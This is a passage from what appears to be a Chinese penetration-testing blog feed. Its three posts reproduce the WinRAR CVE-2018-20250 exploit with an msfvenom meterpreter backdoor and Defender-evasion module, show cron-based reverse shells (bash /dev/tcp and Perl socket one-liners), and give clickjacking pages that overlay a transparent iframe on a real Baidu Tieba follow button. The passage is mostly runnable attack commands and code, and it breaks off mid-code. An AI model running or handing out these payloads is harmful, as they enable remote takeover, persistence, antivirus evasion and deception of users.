    <content type="html"><![CDATA[<h2 id="winRAR远程代码执行漏洞复现-CVE-2018-20250"><a href="#winRAR远程代码执行漏洞复现-CVE-2018-20250" class="headerlink" title="winRAR远程代码执行漏洞复现(CVE-2018-20250)"></a>winRAR远程代码执行漏洞复现(CVE-2018-20250)</h2><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line"> </span><br><span class="line">Bandizip&lt; = 6.2.0.0</span><br><span class="line"> </span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line"> </span><br><span class="line">360压缩&lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>parrot   192.168.1.101</li><li>win7 x64 192.168.1.102</li><li>winrar-x64-561sc</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p>下载WinRAR漏洞exp: <code>sudo git clone https://github.com/WyAtu/CVE-2018-20250</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310334.12.png" alt></p></li><li><p>生成后门文件 <code>udo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -f exe -o ./muma.exe</code></p></li><li><p>修改exp中的后门文件名称以及生成的压缩文件和添加exe的路径<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310478.32.png" alt></p></li><li><p>修改运行acefile.py的Python命令<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310572.16.png" alt></p></li><li><p>运行exp生成可利用的后门rar文件 <code>sudo python3 exp.py</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310653.61.png" alt></p></li><li><p>利用Python快速生成web站点，然后在靶机中访问下载生成好的rar文件</p><ul><li>python2:  <code>sudo python -m SimpleHTTPServer 9999</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310814.1.png" alt></li><li>python3: <code>sudo python3 -m http.server 9999</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559310908.42.png" alt></li></ul></li><li><p>在靶机中解压文件，会将后门程序自动添加到启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7启动项的位置为：C:\Users\主机用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559311136.61.png" alt></p></li><li><p>在攻击机监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.101</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>本地点击模拟重启快速看结果<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559311349.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559311432.53.png" alt></p></li></ul><h3 id="Metasploit生成免杀Payload-载荷-针对Windows10的defender"><a href="#Metasploit生成免杀Payload-载荷-针对Windows10的defender" class="headerlink" title="Metasploit生成免杀Payload 载荷(针对Windows10的defender)"></a>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</h3><h4 id="生成免杀payload"><a href="#生成免杀payload" class="headerlink" title="生成免杀payload"></a>生成免杀payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.101</span><br><span class="line">set lport 4444</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><strong><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559312833.45.png" alt></strong></p><h4 id="结果对比"><a href="#结果对比" class="headerlink" title="结果对比"></a>结果对比</h4><ul><li>没有使用msf5自带的免杀模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559312931.28.png" alt></li><li>使用msf5自带的免杀模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1559312975.09.png" alt></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;winRAR远程代码执行漏洞复现-CVE-2018-20250&quot;&gt;&lt;a href=&quot;#winRAR远程代码执行漏洞复现-CVE-2018-20250&quot; class=&quot;headerlink&quot; title=&quot;winRAR远程代码执行漏洞复现(CVE-2018-2025
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="winRAR" scheme="https://www.lsowl.top/tags/winRAR/"/>
    
  </entry>
  
  <entry>
    <title>Linux定时任务</title>
    <link href="https://www.lsowl.top/2018/11/08/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
    <id>https://www.lsowl.top/2018/11/08/Linux定时任务/</id>
    <published>2018-11-08T14:16:50.000Z</published>
    <updated>2019-11-08T14:30:17.731Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux中的定时任务"><a href="#Linux中的定时任务" class="headerlink" title="Linux中的定时任务"></a>Linux中的定时任务</h3><blockquote><p>主要是为了在Linux中进行一些定时操作，定时任务在平时见到的挖矿中比较多，在渗透中定时任务可以用在反弹shell,在这里记录放在再被网上的坑爹文章误导了</p></blockquote><p>计划任务主要分为定时型的还有突发性的</p><h3 id="定时任务——突发性"><a href="#定时任务——突发性" class="headerlink" title="定时任务——突发性"></a>定时任务——突发性</h3><p>at：它是一个可以处理仅执行一次就结束的指令 </p><p>at语法格式：at 时间 </p><p>安装at   <code>sudo apt-get update &amp;&amp; sudo apt-get install at</code></p><p>启动服务  <code>sudo systemctl restart atd</code></p><p><strong>at计划任务的特殊写法</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at 20:00 2018-10-1 在某天</span><br><span class="line"></span><br><span class="line">at now +10min 在 10分钟后执行</span><br><span class="line"></span><br><span class="line">at 17:00 tomorrow 明天下午5点执行</span><br><span class="line"></span><br><span class="line">at 6:00 pm +3 days 在3天以后的下午6点执行</span><br></pre></td></tr></table></figure><p>实例：重定向字符串到一个txt中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at now + 1min </span><br><span class="line">warning: commands will be executed using /bin/sh</span><br><span class="line">at&gt; <span class="built_in">echo</span> <span class="string">"at_test"</span> &gt;&gt; ./ats.txt</span><br><span class="line"><span class="comment">#然后按  ctrl + d保存</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220165.48.png" alt></p><p><strong>删除计划任务</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atq</span><br><span class="line">atrm   任务编号</span><br><span class="line">atq</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220285.31.png" alt></p><h3 id="定时任务——定时性"><a href="#定时任务——定时性" class="headerlink" title="定时任务——定时性"></a>定时任务——定时性</h3><blockquote><p>有两种方式：cron和crontab，两种在写配置文件时语法基本一致，唯一不同点在与使用cron时在/etc/cron.d/目录下写的定时任务的文件中必须要带上执行定时任务的用户，任务才可以执行；而crontab可以不用执行用户即可执行，使用场景不一样，但是一般在反弹shell时使用写入配置文件比较好。</p></blockquote><h4 id="crontab定时任务的使用"><a href="#crontab定时任务的使用" class="headerlink" title="crontab定时任务的使用"></a>crontab定时任务的使用</h4><p>语法：#crontab -u -e</p><p>常用选项：</p><p>-l：list，列出指定用户的计划任务列表</p><p>-e：edit，编辑指定用户的计划任务列表</p><p>-u：user，指定的用户名，如果不指定，则表示当前用户</p><p>-r：remove，删除指定用户的计划任务列表</p><p><strong>查看计划任务：</strong> <code>crontab -l</code></p><p><strong>编写计划任务：</strong> <code>crontab -e</code> </p><p>计划任务的规则语法格式，以行为单位，一行为一个计划：</p><p><strong>分 时 日 月 周</strong> 需要执行的命令</p><p>执行的命令建议写成<strong>绝对路径</strong>的格式！</p><p>取值范围（常识）：</p><p>分：0~59</p><p>时：0~23</p><p>日：1~31</p><p>月：1~12</p><p>周：0~7，0和7表示星期天</p><p>四个符号：</p><p>*：表示取值范围中的每一个数字</p><p>-：做连续区间表达式的，要想表示1~7，则可以写成：1-7</p><p>/：表示每多少个，例如：想每10分钟一次，则可以在分的位置写：*/10</p><p>,：表示多个取值，比如想在1点，2点6点执行，则可以在时的位置写：1,2,6</p><p><strong>删除命令：</strong> <code>crontab -r</code></p><p>实例：利用crontab写入计划任务反弹shell(每隔一分钟执行一次)</p><p>bash反弹shell指令在计划任务中不太好使，利用Perl加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">*/1 * * * * /usr/bin/perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p>crontab -e写入计划任务</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222011.42.png" alt></p><h4 id="写入-etc-cron-d目录-常用"><a href="#写入-etc-cron-d目录-常用" class="headerlink" title="写入/etc/cron.d目录(常用)"></a>写入/etc/cron.d目录(常用)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/cron.d</span><br><span class="line">vim root</span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;192.168.1.102&quot;;$p=8889;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222307.76.png" alt></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/getbird/p/10857254.html" target="_blank" rel="noopener">https://www.cnblogs.com/getbird/p/10857254.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Linux中的定时任务&quot;&gt;&lt;a href=&quot;#Linux中的定时任务&quot; class=&quot;headerlink&quot; title=&quot;Linux中的定时任务&quot;&gt;&lt;/a&gt;Linux中的定时任务&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;主要是为了在Linux中进行一些定时操作，
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="https://www.lsowl.top/tags/Linux/"/>
    
      <category term="定时任务" scheme="https://www.lsowl.top/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>界面劫持</title>
    <link href="https://www.lsowl.top/2018/10/27/%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81/"/>
    <id>https://www.lsowl.top/2018/10/27/界面劫持/</id>
    <published>2018-10-27T13:53:52.000Z</published>
    <updated>2019-10-27T14:00:57.113Z</updated>
    
    <content type="html"><![CDATA[<h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。</p><h3 id="界面劫持分类"><a href="#界面劫持分类" class="headerlink" title="界面劫持分类"></a>界面劫持分类</h3><ul><li>点击劫持：劫持用户的鼠标点击操作</li><li>拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制)</li><li>触屏劫持：劫持用户触摸屏幕的行为</li></ul><h3 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h3><p>劫持是通过覆盖一个不可见的框，从原理上来说是一个透明层+iframe，透明层是指页面的透明度为零</p><h4 id="透明层使用CSS样式实现"><a href="#透明层使用CSS样式实现" class="headerlink" title="透明层使用CSS样式实现"></a>透明层使用CSS样式实现</h4><p>IE浏览器使用私有的CSS透明属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter:alpha(opacity=<span class="number">50</span>) <span class="comment">//数值从0-100，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure><p>chrome、Firefox等使用的CSS透明属性如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opacity:<span class="number">0.5</span> <span class="comment">//数值从0-1，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure><p>控件位置之间的层次关系使用z-index，任何浏览器都支持</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z-index:<span class="number">1</span>   <span class="comment">//数值可以是负数，高数值的控件会低于低数值控件的前面，数值越高，控件越靠近用户</span></span><br></pre></td></tr></table></figure><h4 id="使用iframe嵌入被劫持的页面"><a href="#使用iframe嵌入被劫持的页面" class="headerlink" title="使用iframe嵌入被劫持的页面"></a>使用iframe嵌入被劫持的页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"victim"</span> src=<span class="string">"http://www.victim.com"</span> scrolling=<span class="string">"no"</span>&gt;   <span class="comment">//通过页面透明层+iframe实现对用户的视觉欺骗，即用户看到的操作对象和实际的操作对象是不一致的</span></span><br></pre></td></tr></table></figure><h3 id="拖放劫持相关"><a href="#拖放劫持相关" class="headerlink" title="拖放劫持相关"></a>拖放劫持相关</h3><blockquote><p>由于拖放劫持和触屏劫持实现较负载，这里只了解相关知识</p></blockquote><h4 id="拖放劫持的思路"><a href="#拖放劫持的思路" class="headerlink" title="拖放劫持的思路"></a>拖放劫持的思路</h4><p>“拖放劫持”的思路是诱使用户从隐藏的不可见iframe中”拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。（突破同源限制）</p><h4 id="拖放劫持技术原理"><a href="#拖放劫持技术原理" class="headerlink" title="拖放劫持技术原理"></a>拖放劫持技术原理</h4><p>支持Drag&amp;Drop API</p><blockquote><p>主流的浏览器都有drag-and-drop API 接口，供网站开发人员创建交互式网页。但是，这些 API 接口在设计时没有考虑很多的安全性问题，导致通过拖拽就可以实现跨域操作。利用拖拽技术，攻击者可以突破很多已有的安全防御措施。</p><p>利用拖拽技术，攻击者可以轻易将文本注入到目标网页。在实际实施过程中，攻击者欺骗用户选择输入框的内容，完成拖拽操作。另外一种方式是，通过浏览器的 API 接口将 iframe 中的内容拖拽到目标网页的 text area 中，攻击者就可以获得用户网页中存在的敏感信息。</p></blockquote><p>dataTransfer对象</p><blockquote><p>为了能够协助通过拖放操作传递数据，在IE5.0以后引入了dataTransfer对象，他作为event对象的一个属性出现，用于从被拖动的对象传递字符串到放置对象。</p><p>dataTransfer对象定义了两个主要方法：getData()和setData().getData操作完成获取由setData所存储的数据。setData操作完成向系统剪贴板中存储需要传递的数据，传递数据分为两种类型：文本数据和URL数据。在HTML5的扩展中，其允许指定任意的MIME类型。有了dataTransfer对象和操作方法后，就为跨域传递数据提供了有效的技术手段</p></blockquote><h4 id="拖放劫持防御方法"><a href="#拖放劫持防御方法" class="headerlink" title="拖放劫持防御方法"></a>拖放劫持防御方法</h4><p>目前只有FireFox和IE浏览器支持拖放功能，Chrome并不支持拖放功能，所以使用Chrome浏览器可在一定程度上防御拖放攻击；对于IE浏览器来说，不使用ActiveX这类危险组件也可以有效防御拖放攻击。</p><h3 id="触屏劫持相关"><a href="#触屏劫持相关" class="headerlink" title="触屏劫持相关"></a>触屏劫持相关</h3><blockquote><p>较为复杂，了解相关知识</p></blockquote><h4 id="触屏劫持防御"><a href="#触屏劫持防御" class="headerlink" title="触屏劫持防御"></a>触屏劫持防御</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、不点击任何不明网站、App上弹出的各种提示信息，例如：手机中病毒需升级杀毒软件等等。最好使用返回键，返回上一级页面，如若恶意跳转，大概率为恶意网站且包含触屏劫持。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">2、苹果手机在使用Safari浏览器的时候，遇到不明情况的提示框或页面，一定要确认地址栏的地址是否隐藏以及是否正确，若网站上含有触屏劫持，则大概率会添加假的地址栏做误导，需谨慎认清。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、安卓手机要多加注意提示框弹出前后，手机系统给出的提示，由于不同安卓手机有很大差别触屏劫持在不同手机上会有不同的效果，但在获取权限时系统都会有好几步的确认工作，所以要多加注意之中细微的差别。</span><br></pre></td></tr></table></figure><h3 id="点击劫持技术实现"><a href="#点击劫持技术实现" class="headerlink" title="点击劫持技术实现"></a>点击劫持技术实现</h3><p>构造一个点击页面，上面覆盖一个透明层的iframe，当诱导用户点击时触发iframe中的页面中的login按钮</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;style&gt;</span></span><br><span class="line"><span class="regexp">        #click&#123;</span></span><br><span class="line"><span class="regexp">            width: 100px;</span></span><br><span class="line"><span class="regexp">            top: 20px;</span></span><br><span class="line"><span class="regexp">            left: 20px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">        z-index: 1</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        #hidden&#123;</span></span><br><span class="line"><span class="regexp">            height: 50px;</span></span><br><span class="line"><span class="regexp">            width: 120px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">            filter: alpha(opacity=50);</span></span><br><span class="line"><span class="regexp">        opacity: 0;</span></span><br><span class="line"><span class="regexp">        z-index: 2</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>style&gt;</span><br><span class="line">    &lt;input id=<span class="string">"click"</span> value=<span class="string">"Click me"</span> type=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">"hidden"</span> src=<span class="string">"inner.html"</span> scrolling=<span class="string">"no"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>inner.html</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;input style="width: 100px;" value="Login" type="button" onclick="alert('clickjacking_test')"/</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png" alt></p><p>说明：</p><p>clickjacking.html是一个用户可见的伪装页面，在其页面中设置iframe所在层为透明层，并在iframe中嵌套了inner.html页面。在clickjacking.html页面中设计了Click me,inner.html中的”login”按钮与其重合，所以在用户点击Click me时实际上点击的是login按钮。</p><h3 id="点击劫持实战"><a href="#点击劫持实战" class="headerlink" title="点击劫持实战"></a>点击劫持实战</h3><p>利用点击劫持诱导用户关注贴吧(在百度账户登录的情况下；目标<code>http://tieba.baidu.com/f?kw=%C3%C0%C5%AE</code></p><p>抓包测试HTTP响应头是否有 X-Frame-Options字段</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146338.05.png" alt></p><p>构造透明层iframe</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">     &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146436.41.png" alt></p><p>修改opacity值为0.3查看覆盖效果</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146499.35.png" alt></p><p>可以看到刚好覆盖在关注按钮上，只有用户登录了百度账户，诱导用户点击即可劫持鼠标点击关注</p><p>一般这种界面不容易诱导用户，所以要构造好诱导页面；在iframe中加载目标站点时，除了点击劫持还可以进行图片覆盖，有些图片的本来就可以诱导用户，当然也可以点击劫持加图片覆盖结合使用</p><p><strong>示例</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>结合刚才的实例一起加载</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span 